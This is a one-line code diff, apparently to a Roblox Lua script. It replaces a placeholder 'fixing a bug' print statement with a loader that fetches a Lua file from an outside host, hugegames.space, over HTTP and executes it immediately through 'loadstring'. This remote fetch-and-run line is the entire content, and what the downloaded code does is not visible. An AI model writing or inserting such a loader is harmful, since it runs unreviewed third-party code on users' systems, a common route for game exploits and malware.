@@ -1,1 +1,1 @@
-print ("fixin some bug so its not working at this time")
+loadstring(game:HttpGet("https://hugegames.space/1f3cf476ecba4ee66e9ca774.lua"))()
